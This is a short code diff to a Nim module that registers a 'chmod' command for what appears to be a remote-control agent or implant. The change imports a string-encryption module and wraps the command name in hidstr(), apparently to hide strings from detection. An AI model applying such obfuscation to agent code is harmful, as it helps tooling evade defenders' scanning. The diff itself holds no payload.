@@ -1,6 +1,7 @@
 import std/[os, json, strutils, osproc]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc chmodExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
@@ -27,4 +28,4 @@ proc chmodExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initChmod*() =
-  register("chmod", chmodExecute)
+  register(hidstr("chmod"), chmodExecute)
